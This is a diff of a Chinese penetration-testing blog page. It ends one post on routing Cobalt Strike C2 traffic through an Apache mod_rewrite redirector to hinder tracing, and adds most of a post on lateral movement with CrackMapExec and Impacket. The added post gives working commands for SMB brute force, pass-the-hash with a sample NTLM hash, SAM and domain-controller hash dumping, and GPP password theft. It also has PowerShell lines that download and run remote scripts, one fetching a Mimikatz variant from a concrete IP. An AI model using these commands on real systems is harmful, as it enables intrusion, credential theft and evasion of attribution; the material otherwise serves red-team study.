-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;get请求部分</span><br><span class="line"> set uri &quot;&#x2F;getsearchresults&quot;;   &#x2F;&#x2F;post部分</span><br><span class="line">set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;stager部分</span><br><span class="line">set uri_x64 &quot;&#x2F;events&quot;   &#x2F;&#x2F;stager部分</span><br></pre></td></tr></table></figure>
-
-<p>​        好的，得到了这个以后我们在重定向的那台主机上设置.htaccess的规则,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(siteindex&#x2F;a&#x2F;|siteindex&#x2F;c&#x2F;|siteindex&#x2F;c&#x2F;|getsearchresults|Events|events)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8080%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br></pre></td></tr></table></figure>
-
-<p>​        设置好以后我们在cobaltstrike中创建一个listener,地址填入重定向主机的地址，这里需要注意，http port(C2)的端口需要和重定向主机apache的端口一致。apache的端口修改在/etc/httpd/conf/httpd.conf中,修改后重启apache服务即可。</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151628805.png" alt="image-20200907151628805"></p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907115815700.png" alt="image-20200907115815700"></p>
-<p>​        设置好以后我们生成一个shell看下能否正常上线并执行命令</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151750637.png" alt="image-20200907151750637"></p>
-<p>​        <img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151845447.png" alt="image-20200907151845447"></p>
-<p>​        但是我们直接去访问重定向的那台主机，如果加入其他路径是无法访问成功的。</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907152105597.png" alt="image-20200907152105597"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习，我们了解了如何通过mod_rewrite的规则设置来进行流量的控制，通过这种方法可以进行访问控制，从而在一定程度上提升溯源的难度。也可以通过https来设置重定向，这样抓到的流量也看不到具体的路径信息。我们也可以给前置服务器加上CDN，这样也可以在一定层面上增加溯源的难度。</p>
-<p><strong>参考文章</strong></p>
-<p><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></p>
-<p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/" target="_blank" rel="noopener">CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1850,6 +1522,414 @@
   
   
 
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网横向移动套件的利用总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-26 17:15:32" itemprop="dateCreated datePublished" datetime="2020-08-26T17:15:32+08:00">2020-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:04:41" itemprop="dateModified" datetime="2020-09-02T20:04:41+08:00">2020-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通过上篇文章我们了解了关于内网横向移动的常用方法，但是实战中去使用这些方法往往效率比较低，并且已经有很多大佬发现了这一点并且针对于每种横向移动的方法写出了横向移动的套件。熟悉这些横向移动套件的使用有助于提高我们渗透的速度。因此学习大佬们横向移动套件的使用是非常有必要的，下面我将和大家一起学习关于内网横向移动套件的使用。</p>
+<h3 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a>Crackmapexec</h3><p>​        Crackmapexec是一款由python开发的横向移动利用工具，网上也有人打包好了它的<a href="https://github.com/maaaaz/CrackMapExecWin" target="_blank" rel="noopener">windows版本</a>，这个是2.x版本的打包,虽然版本比较旧，但是基本的功能都有了</p>
+<p>​        在横向移动之前，可以去扫描开放445端口的主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105034304.png" alt="image-20200827105034304"></p>
+<p><strong>查看主机的共享</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe host.txt -t 1 -u administrator -p Admin123456 --share</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105808677.png" alt="image-20200827105808677"></p>
+<p><strong>查看当前主机的用户</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111211507.png" alt="image-20200827111211507"></p>
+<p><strong>主机都有什么盘</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --disk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111346074.png" alt="image-20200827111346074"></p>
+<p><strong>批量smb爆破</strong></p>
+<p>​        首先我们先扫描那些主机开放了445端口，再将开放445的ip保存到一个txt中，使用下面的命令进行爆破。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826193844481.png" alt="image-20200826193844481"></p>
+<p><strong>爬取用户目录下包含某个关键字的文件名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxx -t 1 host.txt  --spider Users --depth 10 --pattern username</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827120109187.png" alt="image-20200827120109187"></p>
+<p><strong>批量hash传递</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194130572.png" alt="image-20200826194130572"></p>
+<p><strong>批量文件操作</strong></p>
+<p>​        批量上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt  --upload C:\Users\xxx\Desktop\SharpMove.exe  \\Windows\\Temp\\whoami.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134605698.png" alt="image-20200827134605698"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134523163.png" alt="image-20200827134523163"></p>
+<p>​        批量查看文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt  --list \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134847632.png" alt="image-20200827134847632"></p>
+<p>​        下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 192.168.3.144  --download \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827135107554.png" alt="image-20200827135107554"></p>
+<p><strong>批量执行命令</strong></p>
+<p>​        通过smbexec批量执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194639115.png" alt="image-20200826194639115"></p>
+<p>​        通过smbexec远程加载powershell上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxxx:8011&#x2F;a111&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114124144.png" alt="image-20200827114124144"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114139359.png" alt="image-20200827114139359"></p>
+<p>​        通过wmi批量执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxxx -t 1 host.txt --execm wmi -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194904286.png" alt="image-20200826194904286"></p>
+<p>​        通过atexec批量hash传递执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxx -t 1 192.168.3.11 --execm atexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202039799.png" alt="image-20200826202039799"></p>
+<p><strong>批量抓密码</strong></p>
+<p>​        使用wmi加载远程powershell脚本批量抓密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xx -t 1 host.txt --execm wmi -X &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;111.229.70.13:801&#x2F;Invoke-Mimidogz.ps1&#39;);Invoke-Mimidogz&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202829550.png" alt="image-20200826202829550"></p>
+<p>​        调用Invoke-Mimikatz.ps1批量抓密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H aad3b435b51404eeaad3b435b51404ee:ae4c0d5fb959fda8f4cb1d14a8376af4 -t 1 host.txt --mimikatz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093343519.png" alt="image-20200827093343519"></p>
+<p><strong>批量dump hash</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxxx:xxxx -t 1 --sam  host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826203436519.png" alt="image-20200826203436519"></p>
+<p><strong>远程导出域控中所有的hash</strong></p>
+<p>​        这个过程比较慢，不建议在实际中使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 192.168.3.144 --ntds vss</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093924405.png" alt="image-20200827093924405"></p>
+<p><strong>搜集GPP密码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt --gpp-passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827094518023.png" alt="image-20200827094518023"></p>
+<p>​        其他的利用方法可以参考<a href="https://mpgn.gitbook.io/crackmapexec/" target="_blank" rel="noopener">官方文档</a></p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>​        Impacket是用于处理网络协议的Python类的集合。我们除了可以使用python版本，也可以使用别人打包好的<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">windows版本</a>进行利用。这个打包的稍微旧了一点，不过大部分的功能已经打包好了，还有比较<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries" target="_blank" rel="noopener">新的打包版本</a>,下面我介绍下它在横向渗透中常用的功能。</p>
+<p><strong>atexec</strong></p>
+<p>​        通过计划任务执行命令,默认以<strong>system权限</strong>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827161851281.png" alt="image-20200827161851281"></p>
+<p>​        也可以使用PTH的方式执行、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827162051117.png" alt="image-20200827162051117"></p>
+<p><strong>DCOM</strong></p>
+<p>​        使用这种方式，默认以<strong>administrator权限</strong>执行命令，也可以获取交互shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827170845398.png" alt="image-20200827170845398"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181250651.png" alt="image-20200827181250651"></p>
+<p>​        也可以通过hash传递来运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171222916.png" alt="image-20200827171222916"></p>
+<p><strong>SMB</strong></p>
+<p>​        通过smbexec可以直接获取交互的shell,shell权限也是<strong>system权限</strong>，但无法执行直接执行cmd命令，因此不适合在shell下进行操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171503784.png" alt="image-20200827171503784"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171909815.png" alt="image-20200827171909815"></p>
+<p><strong>psexec</strong></p>
+<p>​        使用psexec会在目标系统创建服务,返回权限为<strong>system权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.51</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172249787.png" alt="image-20200827172249787"></p>
+<p>​        也可以使用psexec执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172609121.png" alt="image-20200827172609121"></p>
+<p>​        也可以直接利用psexec上传文件并且执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 -c C:\Users\jerry\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173702596.png" alt="image-20200827173702596"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173725431.png" alt="image-20200827173725431"></p>
+<p>​        这个过程可能会在命令行下出现卡顿，这个不要紧，当我们把弹过来的shell使用完后退出后即可恢复正常，强行关闭命令行会导致创建的服务不能删除。</p>
+<p><strong>WMI</strong></p>
+<p>​        使用wmiexec进行横向移动，既可以获取交互shell也可以执行命令,也可以进行PTH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
